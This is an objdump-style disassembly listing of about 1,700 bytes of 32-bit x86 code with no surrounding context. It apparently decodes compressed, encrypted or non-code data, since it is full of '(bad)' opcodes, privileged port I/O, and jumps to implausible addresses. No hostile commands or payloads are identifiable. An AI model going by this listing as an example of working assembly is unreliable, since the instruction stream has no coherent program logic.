  409f6d:	jae    0x409f09
  409f6f:	scas   eax,DWORD PTR es:[edi]
  409f70:	ins    DWORD PTR es:[edi],dx
  409f71:	mov    DWORD PTR [edi+0xfe360],esp
  409f77:	adc    eax,0xd9efef9f
  409f7c:	scas   eax,DWORD PTR es:[edi]
  409f7d:	dec    ecx
  409f7e:	dec    ebx
  409f7f:	cli    
  409f80:	mov    bl,0xcf
  409f82:	sub    eax,0x5fc4f448
  409f87:	push   eax
  409f88:	mov    es:0x36e98d39,eax
  409f8e:	daa    
  409f8f:	sbb    ecx,edi
  409f91:	fst    st(3)
  409f93:	xchg   BYTE PTR [ecx],cl
  409f95:	sahf   
  409f96:	xchg   DWORD PTR [edx],edi
  409f98:	out    dx,eax
  409f99:	(bad)  
  409f9a:	xor    edx,DWORD PTR [esi+0x3b]
  409f9d:	test   DWORD PTR [eax+ebx*1],0xf53fb754
  409fa4:	adc    eax,DWORD PTR [ebp+0x5f7a7a33]
  409faa:	(bad)  
  409fab:	jae    0x409fba
  409fad:	sbb    DWORD PTR [esi],esi
  409faf:	xchg   BYTE PTR [ecx+0x6],bl
  409fb2:	hlt    
  409fb3:	mov    dl,0xcf
  409fb5:	xor    eax,0xeee85030
  409fba:	push   edx
  409fbb:	loopne 0x40a017
  409fbd:	sahf   
  409fbe:	mov    ch,0xd2
  409fc0:	sbb    DWORD PTR [ebx-0x6daa195],esi
  409fc6:	xlat   BYTE PTR ds:[ebx]
  409fc7:	and    BYTE PTR [ebx],dl
  409fc9:	test   al,0x11
  409fcb:	stc    
  409fcc:	leave  
  409fcd:	daa    
  409fce:	loop   0x409f5f
  409fd0:	call   0xa8f5e2e1
  409fd5:	mov    edx,0x2843245c
  409fda:	(bad)  
  409fdb:	jno    0x409fad
  409fdd:	bound  ebx,QWORD PTR [edx]
  409fdf:	xlat   BYTE PTR ds:[ebx]
  409fe0:	push   edx
  409fe1:	push   cs
  409fe2:	sub    al,0x74
  409fe4:	ret    
  409fe5:	pop    es
  409fe6:	mov    al,0xc5
  409fe8:	daa    
  409fe9:	pop    ss
  409fea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409feb:	pop    ebp
  409fec:	or     ah,BYTE PTR [ecx]
  409fee:	cmp    DWORD PTR [ecx+0x0],eax
  409ff1:	push   edx
  409ff2:	inc    edi
  409ff3:	loopne 0x40a053
  409ff5:	gs lahf 
  409ff7:	das    
  409ff8:	cmp    ah,BYTE PTR [ebx-0x759a1d60]
  409ffe:	jne    0x40a04c
  40a000:	jmp    0x807a8098
  40a005:	neg    edx
  40a007:	aas    
  40a008:	push   ebx
  40a009:	fist   DWORD PTR [eax-0x78f8258c]
  40a00f:	inc    esi
  40a010:	pop    edi
  40a011:	xor    ecx,DWORD PTR [eax+0x6dd21412]
  40a017:	mov    ds:0xa92001ca,eax
  40a01c:	mov    edi,0xc90f86ef
  40a021:	popa   
  40a022:	xchg   edx,eax
  40a023:	fsubrp st(7),st
  40a025:	cmp    al,0x21
  40a027:	mov    esp,0x99b5e105
  40a02c:	ret    
  40a02d:	scas   al,BYTE PTR es:[edi]
  40a02e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a02f:	addr16 jp 0x40a0a5
  40a032:	push   cs
  40a033:	mov    ?,WORD PTR [edi-0x48]
  40a036:	pop    esp
  40a037:	scas   al,BYTE PTR es:[edi]
  40a038:	xchg   esi,eax
  40a039:	sub    ebx,DWORD PTR [edx*8+0x7de53bf4]
  40a040:	cld    
  40a041:	popa   
  40a042:	mov    al,0xa5
  40a044:	in     al,0x4b
  40a046:	mov    edi,0xf1fd6501
  40a04b:	sub    ecx,DWORD PTR [edx-0xb]
  40a04e:	lahf   
  40a04f:	sub    eax,ebx
  40a051:	gs push ds
  40a053:	bound  edx,QWORD PTR [ebp+0x3]
  40a056:	sar    DWORD PTR [edx],0xb5
  40a059:	lods   eax,DWORD PTR ds:[esi]
  40a05a:	dec    eax
  40a05b:	mov    ds:0x3d9e28f6,al
  40a060:	add    esp,ecx
  40a062:	inc    esp
  40a063:	int    0xd3
  40a065:	pop    ebx
  40a066:	xor    al,BYTE PTR [edx-0x2867be49]
  40a06c:	adc    al,0x8b
  40a06e:	dec    esi
  40a06f:	mov    edx,0x868ca93b
  40a074:	sub    al,0x98
  40a076:	mov    al,ds:0x5343f950
  40a07c:	mov    edx,0x44101ee5
  40a081:	pushf  
  40a082:	mov    ds:0xcc3f7bb7,eax
  40a087:	fpatan 
  40a089:	mov    ds:0x28c0a210,eax
  40a08e:	jne    0x40a0e1
  40a090:	fwait
  40a091:	push   cs
  40a092:	cmp    BYTE PTR [eax+edi*1+0x42f92b11],cl
  40a099:	das    
  40a09a:	pop    ebp
  40a09b:	push   esp
  40a09c:	inc    esp
  40a09d:	lods   al,BYTE PTR ds:[esi]
  40a09e:	rcr    DWORD PTR [edx],cl
  40a0a0:	sbb    BYTE PTR [ebp-0x49],0xca
  40a0a4:	and    DWORD PTR [di],0x1b
  40a0a8:	in     eax,dx
  40a0a9:	stc    
  40a0aa:	adc    al,0x9
  40a0ac:	push   edi
  40a0ad:	add    al,0xcb
  40a0af:	lea    edx,[ebp-0x767b0eb0]
  40a0b5:	cmp    BYTE PTR [esi+0x7a],ah
  40a0b8:	xchg   ebx,eax
  40a0b9:	add    al,0xb7
  40a0bb:	xchg   esp,eax
  40a0bc:	or     dh,dh
  40a0be:	dec    esp
  40a0bf:	loope  0x40a06e
  40a0c1:	xlat   BYTE PTR ds:[ebx]
  40a0c2:	retf   
  40a0c3:	mov    ds:0x54370b4b,eax
  40a0c8:	push   edi
  40a0c9:	jp     0x40a060
  40a0cb:	jbe    0x40a0ad
  40a0cd:	inc    edi
  40a0ce:	mov    edi,0x8738882f
  40a0d3:	je     0x40a11b
  40a0d5:	adc    esp,DWORD PTR [esi-0x3b14da9d]
  40a0db:	lods   al,BYTE PTR ds:[esi]
  40a0dc:	pop    ebp
  40a0dd:	dec    ecx
  40a0de:	aam    0x71
  40a0e0:	adc    BYTE PTR [edx],bh
  40a0e2:	shl    BYTE PTR [esi-0x70],0xc3
  40a0e6:	aas    
  40a0e7:	sbb    ch,bh
  40a0e9:	fdivr  DWORD PTR [edx+eax*2-0x794e986c]
  40a0f0:	jne    0x40a128
  40a0f2:	cmp    eax,0xdd704886
  40a0f7:	push   ebx
  40a0f8:	mov    ecx,0xfde5705a
  40a0fd:	scas   eax,DWORD PTR es:[edi]
  40a0fe:	icebp  
  40a0ff:	lahf   
  40a100:	test   eax,0x7bb62256
  40a105:	xchg   ebp,eax
  40a106:	clc    
  40a107:	pop    esi
  40a108:	cmc    
  40a109:	aas    
  40a10a:	jno    0x40a0fe
  40a10c:	cmc    
  40a10d:	sahf   
  40a10e:	mov    bh,0x7d
  40a110:	bound  ebx,QWORD PTR [ecx+0x6ee7a404]
  40a116:	add    bh,BYTE PTR [esi+0x125a284f]
  40a11c:	dec    edi
  40a11d:	scas   eax,DWORD PTR es:[edi]
  40a11e:	psubusw mm0,QWORD PTR [ecx+0x5b25f7fb]
  40a125:	dec    ecx
  40a126:	xchg   esi,eax
  40a127:	sbb    DWORD PTR [eax-0x6],ecx
  40a12a:	sub    BYTE PTR [esp+esi*4-0xf],ah
  40a12e:	sbb    eax,0x7634bc2
  40a133:	cmp    ch,cl
  40a135:	push   ebp
  40a136:	lea    esi,[edx]
  40a138:	pusha  
  40a139:	fs fcmovb st,st(6)
  40a13c:	push   0x48
  40a13e:	xlat   BYTE PTR ds:[ebx]
  40a13f:	push   edx
  40a140:	ins    DWORD PTR es:[edi],dx
  40a141:	push   eax
  40a142:	pop    ebx
  40a143:	leave  
  40a144:	es pop edi
  40a146:	adc    al,0x2c
  40a148:	ins    DWORD PTR es:[edi],dx
  40a149:	mov    dl,0xdf
  40a14b:	or     eax,0xef210953
  40a150:	jmp    0x40a127
  40a152:	sbb    ah,BYTE PTR [eax+0x4e]
  40a155:	pop    edi
  40a156:	jecxz  0x40a18a
  40a158:	outs   dx,DWORD PTR ds:[esi]
  40a159:	sbb    eax,0x9de5a652
  40a15e:	mov    ds:0xee3d7c7c,al
  40a163:	xchg   BYTE PTR [ebx-0x71f30cb0],ch
  40a169:	mul    DWORD PTR ds:[ecx]
  40a16c:	mov    al,BYTE PTR [esi+0x51]
  40a16f:	push   ecx
  40a170:	inc    ebx
  40a171:	rcl    BYTE PTR [edi+0x70264a8c],1
  40a177:	js     0x40a18d
  40a179:	ins    DWORD PTR es:[edi],dx
  40a17a:	scas   al,BYTE PTR es:[edi]
  40a17b:	in     eax,dx
  40a17c:	or     al,0x83
  40a17e:	and    BYTE PTR [edx+0x71],cl
  40a181:	cmp    DWORD PTR [eax],edx
  40a183:	push   ss
  40a184:	xchg   edi,eax
  40a185:	les    edi,FWORD PTR [ecx-0x26b86d6f]
  40a18b:	pop    eax
  40a18c:	push   0x5cdd9314
  40a191:	xchg   ebp,eax
  40a192:	push   ebp
  40a193:	jno    0x40a1b6
  40a195:	jns    0x40a187
  40a197:	icebp  
  40a198:	ret    
  40a199:	pushf  
  40a19a:	pop    ss
  40a19b:	cmc    
  40a19c:	and    BYTE PTR [esi],0xd2
  40a19f:	and    BYTE PTR [ebp+0x31],dh
  40a1a2:	add    eax,ebp
  40a1a4:	test   eax,0x1ccd840e
  40a1a9:	jne    0x40a1f1
  40a1ab:	imul   ebp,DWORD PTR [eax-0x6b],0x5d
  40a1af:	ret    
  40a1b0:	inc    eax
  40a1b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1b2:	or     eax,0x1d280587
  40a1b7:	stos   DWORD PTR es:[edi],eax
  40a1b8:	(bad)  
  40a1b9:	xlat   BYTE PTR ds:[ebx]
  40a1ba:	and    al,0xf1
  40a1bc:	fcomp  QWORD PTR ds:0xfc356e22
  40a1c2:	fwait
  40a1c3:	aam    0x5a
  40a1c5:	std    
  40a1c6:	xchg   edx,eax
  40a1c7:	mov    esp,0xc8723b85
  40a1cc:	(bad)  
  40a1cd:	cmp    al,0x3c
  40a1cf:	cmp    eax,0x60831a08
  40a1d4:	repz sbb al,0xf1
  40a1d7:	shr    BYTE PTR [ecx],cl
  40a1d9:	cmp    eax,DWORD PTR [edi]
  40a1db:	dec    ebp
  40a1dc:	std    
  40a1dd:	adc    al,0xb3
  40a1df:	inc    ecx
  40a1e0:	out    0xf1,al
  40a1e2:	fcomp  DWORD PTR [ebx+0xf319e4]
  40a1e8:	sbb    eax,0x6ae683be
  40a1ed:	imul   ebx,DWORD PTR [eax-0x31],0x947889e7
  40a1f4:	inc    edi
  40a1f5:	popf   
  40a1f6:	mov    esp,0xe25220c2
  40a1fb:	lods   al,BYTE PTR ds:[esi]
  40a1fc:	push   edi
  40a1fd:	je     0x40a1ad
  40a1ff:	mov    ss,WORD PTR ds:0x58b56271
  40a205:	xor    eax,0x941705ae
  40a20a:	pop    edx
  40a20b:	fcomi  st,st(3)
  40a20d:	pop    ds
  40a20e:	pop    ebx
  40a20f:	in     al,dx
  40a210:	scas   eax,DWORD PTR es:[edi]
  40a211:	rep lods eax,DWORD PTR ds:[esi]
  40a213:	jle    0x40a1ae
  40a215:	lds    esp,FWORD PTR [edx-0x38ee9cd8]
  40a21b:	xchg   BYTE PTR [ebx],dl
  40a21d:	sbb    eax,DWORD PTR [ebp-0x2d]
  40a220:	lods   al,BYTE PTR ds:[esi]
  40a221:	aas    
  40a222:	mov    edi,0xc29ef101
  40a227:	and    eax,0x5a6a820
  40a22c:	inc    esi
  40a22d:	xchg   DWORD PTR [edx+ecx*4-0x45],edx
  40a231:	ror    BYTE PTR [esp+edx*1-0x3219943c],1
  40a238:	or     dh,BYTE PTR [edx+0x6d]
  40a23b:	mov    edx,0x8837b075
  40a240:	mov    bl,0x40
  40a242:	jb     0x40a24e
  40a244:	shr    BYTE PTR [ecx-0x33f57b15],0xe
  40a24b:	jb     0x40a2b5
  40a24d:	and    al,0xc6
  40a24f:	push   ds
  40a250:	sbb    DWORD PTR [ebx-0x61],esi
  40a253:	push   ss
  40a254:	fs push es
  40a256:	push   ss
  40a257:	aad    0xc2
  40a259:	(bad)  
  40a25b:	out    0x31,eax
  40a25d:	xor    DWORD PTR [ecx-0x78],edi
  40a260:	pusha  
  40a261:	(bad)  
  40a262:	stc    
  40a263:	push   es
  40a264:	aad    0xc3
  40a266:	mov    esp,0xceb52c00
  40a26b:	cdq    
  40a26c:	fcmovnbe st,st(2)
  40a26e:	fadd   QWORD PTR [esi-0x7]
  40a271:	fld    TBYTE PTR [edx-0x3b]
  40a274:	jp     0x40a232
  40a276:	xchg   edi,eax
  40a277:	cmp    ah,bh
  40a279:	outs   dx,BYTE PTR ds:[esi]
  40a27a:	mov    ebp,0x964341f9
  40a27f:	in     al,0x57
  40a281:	into   
  40a282:	cmp    DWORD PTR [eax+0x78],eax
  40a285:	push   esp
  40a286:	in     eax,0x1a
  40a288:	inc    DWORD PTR [ecx+0x59]
  40a28b:	(bad)  
  40a28c:	cdq    
  40a28d:	enter  0x99b5,0x33
  40a291:	aad    0x41
  40a293:	inc    esi
  40a294:	(bad)  
  40a295:	lods   eax,DWORD PTR ds:[esi]
  40a296:	xchg   ecx,eax
  40a297:	or     BYTE PTR [ebp-0x3903acb8],ch
  40a29d:	jo     0x40a221
  40a29f:	rcr    DWORD PTR [ecx+ebp*8],cl
  40a2a2:	push   esp
  40a2a3:	adc    eax,0xff8b5a64
  40a2a8:	mov    ch,0x9e
  40a2aa:	xchg   esp,eax
  40a2ab:	adc    DWORD PTR [edi+0x7693aefc],ebx
  40a2b1:	pop    esi
  40a2b2:	mov    edx,0xa6e41cf8
  40a2b7:	lea    ebx,ds:0xa411be92
  40a2bd:	xor    DWORD PTR [edi+0x1f],0x739f6cb0
  40a2c4:	dec    edx
  40a2c5:	sbb    edx,DWORD PTR [edx]
  40a2c7:	lods   eax,DWORD PTR ds:[esi]
  40a2c8:	pop    eax
  40a2c9:	mov    al,BYTE PTR [esi+0x1f]
  40a2cc:	dec    eax
  40a2cd:	xchg   ebx,eax
  40a2ce:	jg     0x40a2a5
  40a2d0:	dec    edi
  40a2d1:	jb     0x40a29a
  40a2d3:	jg     0x40a2a9
  40a2d5:	xchg   edx,eax
  40a2d6:	dec    edi
  40a2d7:	nop
  40a2d8:	mov    dh,0x57
  40a2da:	cmp    bl,BYTE PTR [ecx]
  40a2dc:	adc    eax,0x33fc2520
  40a2e1:	or     ebp,DWORD PTR [esi-0x1d]
  40a2e4:	loopne 0x40a2fa
  40a2e6:	bound  esp,QWORD PTR [edi+0xd73e2fa]
  40a2ec:	jae    0x40a338
  40a2ee:	loop   0x40a2db
  40a2f0:	sbb    ecx,DWORD PTR fs:[edx+0x63]
  40a2f4:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40a2f6:	int3   
  40a2f7:	xor    DWORD PTR [edx+0x2],ebx
  40a2fa:	push   esp
  40a2fb:	daa    
  40a2fc:	dec    ebx
  40a2fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2fe:	xor    eax,0xba864abd
  40a303:	mov    cl,0xdc
  40a305:	shr    DWORD PTR [eax-0x8],0x3a
  40a309:	adc    eax,0xda7231a8
  40a30e:	dec    esp
  40a30f:	(bad)  
  40a310:	bswap  esi
  40a312:	mov    al,ds:0x89cd1e3a
  40a317:	xor    cl,BYTE PTR [ebx+edx*2+0x4a]
  40a31b:	sbb    al,0xd1
  40a31d:	fs adc al,0x92
  40a320:	clc    
  40a321:	aas    
  40a322:	inc    edi
  40a323:	mov    dh,0x48
  40a325:	mov    ah,0x94
  40a327:	dec    edi
  40a328:	sbb    eax,0x16d1ff5e
  40a32d:	mov    ds:0xcb759cd,eax
  40a332:	fisttp DWORD PTR ds:0xe422e2f8
  40a338:	inc    ebp
  40a339:	mov    BYTE PTR [esi],ch
  40a33b:	sbb    bl,BYTE PTR [esi+0x8419eb9]
  40a341:	dec    ebp
  40a342:	loope  0x40a3aa
  40a344:	(bad)
  40a348:	stos   BYTE PTR es:[edi],al
  40a349:	(bad)  
  40a34a:	fisttp WORD PTR [edx-0x75cd4c9c]
  40a350:	adc    esp,ebp
  40a352:	xchg   cl,dh
  40a354:	fimul  DWORD PTR [ebx]
  40a356:	test   eax,0x2eb85f64
  40a35b:	xlat   BYTE PTR ds:[ebx]
  40a35c:	jecxz  0x40a37d
  40a35e:	push   0x387951be
  40a363:	lea    ecx,[edx]
  40a365:	mov    esp,0xaf8feb55
  40a36a:	fstp   DWORD PTR [ebp+0x75]
  40a36d:	pop    edi
  40a36e:	xchg   esi,eax
  40a36f:	arpl   WORD PTR [ebx-0x2f546950],sp
  40a375:	out    0x52,al
  40a377:	jmp    0x40a36f
  40a379:	jno    0x40a36c
  40a37b:	jl     0x40a38d
  40a37d:	xchg   esi,eax
  40a37e:	sar    BYTE PTR [ebx+0x6],0x30
  40a382:	pop    eax
  40a383:	daa    
  40a384:	adc    DWORD PTR [eax+0x66e61d3],edi
  40a38a:	dec    esp
  40a38b:	inc    esp
  40a38c:	push   esp
  40a38d:	out    0x5b,eax
  40a38f:	pop    es
  40a390:	sbb    al,0xea
  40a392:	ss jbe 0x40a343
  40a395:	mov    edx,?
  40a397:	sub    esp,edi
  40a399:	mov    dl,0x66
  40a39b:	and    eax,0x752820b2
  40a3a0:	and    dl,BYTE PTR [ecx]
  40a3a2:	mov    bh,0x8a
  40a3a4:	push   esp
  40a3a5:	hlt    
  40a3a6:	mov    esp,0x483d4330
  40a3ab:	dec    ebp
  40a3ac:	lods   eax,DWORD PTR ds:[esi]
  40a3ad:	fisttp DWORD PTR [esi+0x5a]
  40a3b0:	out    dx,eax
  40a3b1:	adc    eax,0x1863d7d8
  40a3b6:	inc    esi
  40a3b7:	repnz imul ebx,ebp,0x7b780759
  40a3be:	and    DWORD PTR [edi],edx
  40a3c0:	adc    eax,0xc4e614f2
  40a3c5:	aas    
  40a3c6:	cmp    DWORD PTR [ecx],eax
  40a3c8:	push   es
  40a3c9:	sbb    BYTE PTR [ebp-0x32],0x1f
  40a3cd:	sub    bh,dl
  40a3cf:	gs out 0x11,al
  40a3d2:	sub    al,BYTE PTR [ecx-0xac1fe13]
  40a3d8:	mov    ds:0x7034fde3,al
  40a3dd:	enter  0x713c,0xac
  40a3e1:	mov    WORD PTR ds:0x58c7d84a,ss
  40a3e7:	mov    ds:0xef53a0e7,eax
  40a3ec:	ins    DWORD PTR es:[edi],dx
  40a3ed:	sub    eax,0xaefc9c80
  40a3f2:	sub    al,0x11
  40a3f4:	cmp    eax,0xf6dd04fd
  40a3f9:	int3   
  40a3fa:	xor    ah,BYTE PTR ds:0x6e0bfb1c
  40a400:	or     BYTE PTR [ebp+0x7a03b492],ah
  40a406:	pop    edx
  40a407:	lods   al,BYTE PTR ds:[esi]
  40a408:	push   0xee229a3f
  40a40d:	std    
  40a40e:	test   al,0x1d
  40a410:	fidivr DWORD PTR [ebx+0x56120b69]
  40a416:	lods   eax,DWORD PTR ds:[esi]
  40a417:	mov    ch,BYTE PTR [ebp+0x434010ea]
  40a41d:	stos   BYTE PTR es:[edi],al
  40a41e:	mov    ah,0xbe
  40a420:	fadd   QWORD PTR [ecx-0x58721f7f]
  40a426:	or     al,0x49
  40a428:	je     0x40a432
  40a42a:	pop    ebp
  40a42b:	cmp    BYTE PTR [ecx],cl
  40a42d:	jl     0x40a3da
  40a42f:	pop    edx
  40a430:	mov    edx,0x8fe8179b
  40a435:	(bad)  
  40a437:	fild   QWORD PTR ds:0x5a693924
  40a43d:	mov    esp,0x45123978
  40a442:	sub    eax,esi
  40a444:	and    al,0xf1
  40a446:	(bad)  
  40a447:	xchg   ebx,eax
  40a448:	dec    edi
  40a449:	or     al,0x49
  40a44b:	ds jp  0x40a3e2
  40a44e:	sbb    edi,DWORD PTR [ecx+0x128e6d7f]
  40a454:	mov    dh,0x1b
  40a456:	mov    ch,0x6c
  40a458:	xor    eax,0xb1f868d9
  40a45d:	jae    0x40a42d
  40a45f:	sbb    edx,0x3125eed6
  40a465:	nop
  40a466:	ret    
  40a467:	mov    al,ds:0x98c65f3e
  40a46c:	jnp    0x40a405
  40a46e:	stc    
  40a46f:	mov    eax,ds:0x1b41d8
  40a474:	and    eax,0x46348792
  40a479:	jae    0x40a4bd
  40a47b:	retf   
  40a47c:	xor    al,0xa2
  40a47e:	xor    DWORD PTR [ebp-0x30fce979],eax
  40a484:	push   ebp
  40a485:	popa   
  40a486:	jne    0x40a4ae
  40a488:	dec    edi
  40a489:	inc    ebx
  40a48a:	or     al,0xec
  40a48c:	jmp    0xf04af4d1
  40a491:	sub    eax,0x31b7b3e5
  40a496:	leave  
  40a497:	aas    
  40a498:	xor    eax,0x54903c40
  40a49d:	add    eax,0xdd457d5
  40a4a2:	cmp    al,0xc7
  40a4a4:	lds    ebp,FWORD PTR [esi+0x1f]
  40a4a7:	adc    bl,dh
  40a4a9:	(bad)  
  40a4aa:	xor    DWORD PTR [ebx],edx
  40a4ac:	mov    eax,0x9d075c7a
  40a4b1:	and    eax,0x161d1696
  40a4b6:	cmp    DWORD PTR [edi],ecx
  40a4b8:	data16 cld 
  40a4ba:	js     0x40a4d4
  40a4bc:	(bad)  
  40a4bd:	sahf   
  40a4be:	addr16 pop ds
  40a4c0:	sub    BYTE PTR [ecx+ecx*4-0x115b6bb5],bh
  40a4c7:	sahf   
  40a4c8:	(bad)  
  40a4c9:	lahf   
  40a4ca:	in     al,dx
  40a4cb:	popf   
  40a4cc:	rcl    BYTE PTR [ecx+0x1cdabfb3],cl
  40a4d2:	lds    ebp,FWORD PTR [ecx-0x12]
  40a4d5:	cmp    cl,cl
  40a4d7:	out    dx,al
  40a4d8:	mov    al,0xeb
  40a4da:	imul   eax,DWORD PTR [edi],0xe55ad841
  40a4e0:	mov    edx,0x2ef9dd80
  40a4e5:	jge    0x40a4f3
  40a4e7:	stos   DWORD PTR es:[edi],eax
  40a4e8:	xor    BYTE PTR [eax],dh
  40a4ea:	scas   eax,DWORD PTR es:[edi]
  40a4eb:	mov    dh,0xf2
  40a4ed:	push   ebp
  40a4ee:	mov    dl,dh
  40a4f0:	test   BYTE PTR [edi+eax*1],ch
  40a4f3:	not    DWORD PTR [eax]
  40a4f5:	mov    al,ds:0x7afdaf50
  40a4fa:	sbb    ebp,DWORD PTR [ebx]
  40a4fc:	mov    ebp,0xd1482522
  40a501:	pop    edi
  40a502:	push   edx
  40a503:	push   esi
  40a504:	or     BYTE PTR [edi-0x2],bh
  40a507:	adc    DWORD PTR es:[edx],ecx
  40a50a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a50b:	imul   edx,esi,0x188a3417
  40a511:	xor    DWORD PTR [eax],ebp
  40a513:	mov    ebp,ebp
  40a515:	cwde   
  40a516:	aas    
  40a517:	ins    BYTE PTR es:[edi],dx
  40a518:	xchg   DWORD PTR [esi],esi
  40a51a:	popf   
  40a51b:	ins    BYTE PTR es:[edi],dx
  40a51c:	adc    bh,BYTE PTR [edx+0x55]
  40a51f:	cmp    BYTE PTR [edx-0x317f3103],0xea
  40a526:	pop    es
  40a527:	leavew 
  40a529:	adc    dh,ah
  40a52b:	pusha  
  40a52c:	in     eax,0x4
  40a52e:	(bad)  
  40a52f:	pop    esi
  40a530:	sub    al,0xb6
  40a532:	mov    ds:0x8326300d,eax
  40a537:	dec    eax
  40a538:	and    eax,0xce49f580
  40a53d:	xchg   edi,eax
  40a53e:	push   edx
  40a53f:	arpl   WORD PTR [esi-0x25],sp
  40a542:	adc    eax,0xe2222be5
  40a547:	mov    ebp,0xb99714d7
  40a54c:	push   cs
  40a54d:	push   0x1a9ce737
  40a552:	pop    ds
  40a553:	out    dx,eax
  40a554:	test   BYTE PTR [eax-0x68075bee],dh
  40a55a:	pop    esp
  40a55b:	fisttp QWORD PTR [ebp+eax*4-0x3a844b84]
  40a562:	pop    ebx
  40a563:	mov    DWORD PTR [esi-0x7e],0x39b1900d
  40a56a:	or     bh,0xa7
  40a56d:	fwait
  40a56e:	mov    edi,0xb6aa24a9
  40a573:	inc    esi
  40a574:	mov    ds:0x14548de6,eax
  40a579:	test   eax,0x8bcae979
  40a57e:	rcl    BYTE PTR [eax],cl
  40a580:	movd   DWORD PTR [eax+esi*1],mm2
  40a584:	mov    ch,0x56
  40a586:	mov    bl,0x7b
  40a588:	mov    WORD PTR ds:0x9f1b61e5,ds
  40a58e:	ds xchg ebx,eax
  40a590:	mov    ch,0x41
  40a592:	rcl    BYTE PTR [edx],0xb1
  40a595:	jmp    0x40a587
  40a597:	pop    ds
  40a598:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a599:	pop    ebx
  40a59a:	adc    DWORD PTR [edi+0x6b],0xffffffff
  40a59e:	aas    
  40a59f:	aas    
  40a5a0:	div    ecx
  40a5a2:	add    al,0x36
  40a5a4:	(bad)  
  40a5a5:	test   ah,0x69
  40a5a8:	jecxz  0x40a545
  40a5aa:	lds    eax,FWORD PTR [ebx]
  40a5ac:	adc    al,0x42
  40a5ae:	adc    al,0x28
  40a5b0:	int    0xce
  40a5b2:	push   esi
  40a5b3:	jo     0x40a54a
  40a5b5:	or     ebx,edx
  40a5b7:	mov    al,ds:0x8ed16085
  40a5bc:	js     0x40a5b0
  40a5be:	test   al,0xa6
  40a5c0:	aas    
  40a5c1:	fidiv  DWORD PTR [esi+0x75]
  40a5c4:	jnp    0x40a5f6
  40a5c6:	sti    
  40a5c7:	jp     0x40a59d
  40a5c9:	or     ebx,edi
  40a5cb:	mov    esp,DWORD PTR [esi+0x61d46320]
  40a5d1:	jae    0x40a643
  40a5d3:	jmp    0xadd6a0b7
  40a5d8:	(bad)  
  40a5d9:	jmp    0x40a5d6
  40a5db:	cmp    DWORD PTR [esi+edi*8+0x78],0x4c
  40a5e0:	imul   edi,DWORD PTR [ecx+0x5d98372f],0x668990dd
  40a5ea:	or     BYTE PTR [ebp+edx*4-0x44b8dd0b],dl
  40a5f1:	cli    
  40a5f2:	jbe    0x40a613
  40a5f4:	push   eax
  40a5f5:	int    0x9d
  40a5f7:	mov    bl,0x80
  40a5f9:	sub    eax,0x75626b8f
  40a5fe:	dec    eax
  40a5ff:	popa   
  40a600:	sbb    dl,ch
  40a602:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a603:	jo     0x40a65f
  40a605:	das    
  40a606:	(bad)  
  40a607:	stc    
  40a608:	mov    BYTE PTR [ebx],cl
  40a60a:	inc    eax
  40a60b:	es push es
  40a60d:	ret    0xed5f
  40a610:	test   al,0x4e
  40a612:	jmp    0x3a2:0xb289aad7
  40a619:	jmp    0x40a603
  40a61b:	or     eax,0x9552a4ec
  40a620:	adc    ah,BYTE PTR [eax+esi*2+0x48da94f5]
  40a627:	es int 0x5b
  40a62a:	jp     0x40a5f0
  40a62c:	mov    dh,0x8e
  40a62e:	outs   dx,BYTE PTR ds:[si]
  40a630:	or     eax,0xcbc89bb9
  40a635:	popa   
  40a636:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a637:	retf   0x757d
  40a63a:	je     0x40a5e6
  40a63c:	sub    al,0xc0
  40a63e:	xor    BYTE PTR [ebx],dh
  40a640:	xchg   ecx,eax
  40a641:	retf   
  40a642:	test   DWORD PTR [edx+0x2b1f60ba],ecx
  40a648:	cwde   
  40a649:	cs jb  0x40a623
  40a64c:	xor    dh,cl
  40a64e:	sub    eax,0xdf0ca610
  40a653:	cld    
  40a654:	mov    edi,0xfebb4a30
  40a659:	adc    ecx,ebx
  40a65b:	scas   al,BYTE PTR es:[edi]
  40a65c:	out    0x52,al
  40a65e:	arpl   WORD PTR [edx+0x285baa4c],si
  40a664:	stos   BYTE PTR es:[edi],al
  40a665:	inc    eax
  40a666:	nop
  40a667:	aad    0x91
  40a669:	add    eax,0x598e559a
  40a66e:	sub    BYTE PTR [edx],bh
  40a670:	clc    
  40a671:	loopne 0x40a646
  40a673:	aam    0x81
  40a675:	mov    ds:0xbcd3aff5,al
  40a67a:	push   DWORD PTR [ebp+0x50]
  40a67d:	imul   BYTE PTR [edi+0x7ca75b1f]
  40a683:	in     eax,0x19
  40a685:	das    
  40a686:	sbb    eax,0xe6585cd5
  40a68b:	xchg   esi,eax
  40a68c:	add    edi,DWORD PTR [ebp+0x46]
  40a68f:	dec    ebx
  40a690:	jle    0x40a684
  40a692:	jno    0x40a6cb
  40a694:	inc    esi
  40a695:	push   0x2a
  40a697:	dec    eax
  40a698:	pop    esp
  40a699:	pop    edx
  40a69a:	stos   BYTE PTR es:[edi],al
  40a69b:	adc    BYTE PTR [edi+0x15],bh
  40a69e:	xchg   edx,eax
  40a69f:	pop    eax
  40a6a0:	and    BYTE PTR [eax],ch
  40a6a2:	push   ecx
  40a6a3:	cld    
  40a6a4:	stos   BYTE PTR es:[edi],al
  40a6a5:	pop    ds
  40a6a6:	popa   
  40a6a7:	sub    ebp,DWORD PTR [ebx]
  40a6a9:	adc    al,0xfe
  40a6ab:	ror    BYTE PTR [edi-0x4e5a2b8],cl
  40a6b1:	push   ebp
  40a6b2:	mov    dl,0x56
  40a6b4:	push   ss
  40a6b5:	xor    BYTE PTR [ebx+esi*4],0xfe
  40a6b9:	scas   al,BYTE PTR es:[edi]
  40a6ba:	pop    esp
  40a6bb:	stc    
  40a6bc:	sub    esp,DWORD PTR [esi-0x32]
  40a6bf:	ins    DWORD PTR es:[edi],dx
  40a6c0:	sub    edx,ebx
  40a6c2:	cmp    eax,DWORD PTR [edi-0x76]
  40a6c5:	or     dl,BYTE PTR [edi-0x55]
  40a6c8:	sahf   
  40a6c9:	push   eax
  40a6ca:	les    esi,FWORD PTR [edx-0x5e12beb9]
  40a6d0:	out    0xab,eax
  40a6d2:	jbe    0x40a65a
